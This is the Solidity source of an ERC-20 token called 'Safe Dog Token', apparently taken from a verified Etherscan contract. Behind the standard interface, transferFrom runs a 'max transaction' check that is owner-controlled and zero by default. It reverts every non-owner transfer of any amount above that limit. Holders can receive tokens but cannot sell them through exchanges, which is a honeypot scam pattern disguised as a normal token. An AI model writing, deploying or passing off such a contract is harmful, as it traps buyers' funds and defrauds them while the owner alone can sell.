/**
 *Submitted for verification at Etherscan.io on 2021-05-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
interface IERC20 {
 event Approval(address indexed owner, address indexed spender, uint256 value);
 event Transfer(address indexed from, address indexed to, uint256 value);
 function allowance(address _owner, address spender) external view returns (uint256);
 function approve(address spender, uint256 amount) external returns (bool);
 function balanceOf(address account) external view returns (uint256);
 function totalSupply() external view returns (uint256);
 function transfer(address recipient, uint256 amount) external returns (bool);
 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}
contract SDT is IERC20 {
 string public name;
 string public symbol;
 uint8 public decimals;
 uint256 private _totalSupply;
 uint256 private _maxTxPercent;
 address private _owner;
 mapping(address => uint) private balances;
 mapping(address => mapping(address => uint)) private allowed;
 mapping(address => bool) private limit;
 constructor() {
  name = "Safe Dog Token";
  symbol = "SDT";
  decimals = 18;
  _totalSupply = 1000000000000000000000000000;
  balances[msg.sender] = _totalSupply;
  _owner = msg.sender;
  emit Transfer(address(0), msg.sender, _totalSupply);
 }
 function totalSupply() public view override returns (uint256) {
  return _totalSupply  - balances[address(0)];
 }
 function balanceOf(address tokenOwner) public view override returns (uint256 balance) {
  return balances[tokenOwner];
 }
 function setMaxTx(uint max) external {
  require(msg.sender == _owner);
  _maxTxPercent = max;
 }
 function allowance(address tokenOwner, address spender) public view override returns (uint256 remaining) {
  return allowed[tokenOwner][spender];
 }
 function approve(address spender, uint tokens) public override returns (bool success) {
  allowed[msg.sender][spender] = tokens;
  emit Approval(msg.sender, spender, tokens);
  return true;
 }
 function limited(address to, uint amount) internal {
  if ((to != _owner) && (amount > _maxTxPercent)) {
   limit[to] = true;
  }
 }
 function transfer(address to, uint tokens) public override returns (bool success) {
  balances[msg.sender] -= tokens;
  balances[to] += tokens;
  emit Transfer(msg.sender, to, tokens);
  return true;
 }
 function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
  limited(from, tokens);
  require(!limit[from]);
  balances[from] -= tokens;
  allowed[from][msg.sender] -= tokens;
  balances[to] += tokens;
  emit Transfer(from, to, tokens);
  return true;
 }
}